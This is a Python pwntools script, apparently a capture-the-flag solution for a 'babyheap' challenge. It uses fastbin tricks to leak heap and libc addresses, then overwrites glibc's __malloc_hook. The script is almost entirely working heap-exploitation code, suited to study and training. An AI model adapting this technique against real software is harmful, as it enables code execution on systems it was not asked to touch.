#!/usr/bin/python

from pwn import *

r = remote("pwnhost.local",7331)
#r = process("./babyheap")

def alloc(size):
        r.sendline("1")
        r.recvuntil("Size:")
        r.sendline(str(size))
        r.recvuntil("Command:")

def fill(idx,size,data):
        r.sendline("2")
        r.recvuntil("Index:")

        r.sendline(str(idx))
        r.recvuntil("Size:")

        r.sendline(str(size))
        r.recvuntil("Content:")

        r.sendline(data)
        r.recvuntil("Command:")


def free(idx):
        r.sendline("3")
        r.recvuntil("Index:")
        r.sendline(str(idx))
        r.recvuntil("Command:")

def dump(idx):
        r.sendline("4")
        r.recvuntil("Index:")
        r.sendline(str(idx))

pause()


# HEAP LEAK

alloc(0x10) #0 FAST
alloc(0x10) #1 FAST -> fastbinFD
alloc(0x10) #2 FAST

free(2)
free(1)

pld = p64(0)*3
pld += p64(0x21)
pld += chr(0)
fill(0,len(pld),pld)

alloc(0x10) # > 1
alloc(0x10) # > 2

free(1)
free(0)

dump(2)
r.recvline()
heap_leak = u64(r.recvline()[:8]) - 0x20
fake_chunk = heap_leak + 0x160
print "heap base @ ",hex(heap_leak)

# OVERLAP PLAN

alloc(0x20) #0 FAST
alloc(0x70) #1 FAST
alloc(0x70) #3 FAST
alloc(0x80) #4 SMALL
alloc(0x20) #5 FAST

free(3)
free(1)

pld = ""
pld += p64(0)*5
pld += p64(0x81)
pld += p64(fake_chunk)
pld += p64(0)*14
pld += p64(0x81)
pld += p64(0)*8
pld += p64(0) #prev_size
pld += p64(0x81) #fake size

fill(0,len(pld),pld)

alloc(0x70) #1
alloc(0x70) #3

pld = ""
pld += p64(0)*5
pld += p64(0x91)

fill(3,len(pld),pld)
free(4)
dump(3)

r.recvuntil(p64(0x91)) 

libc_leak = u64(r.recv(8))
__malloc_hook = libc_leak - 0x68
libc_base = __malloc_hook - 0x397af0

fake_addr = __malloc_hook - 0x23

print 'libc leak  @ ',hex(libc_leak)
print 'libc base  @ ',hex(libc_base)
print 'mallo HOOX @ ',hex(__malloc_hook)
print 'fake addr  @ ',hex(fake_addr)

# OVERWRITE PART

alloc(0x80) #4 SMALL
alloc(0x30) #6
alloc(0x60) #7
alloc(0x60) #8

free(8)
free(7)

pld =  p64(0)*7
pld += p64(0x71)
pld += p64(fake_addr)

fill(6,len(pld),pld)

alloc(0x60) #7
alloc(0x60) #8

pld = chr(0)*0x13
pld += p64(0x69)  # EIP CONTROLED
fill(8,len(pld),pld) #call __malloc_hook

r.interactive()
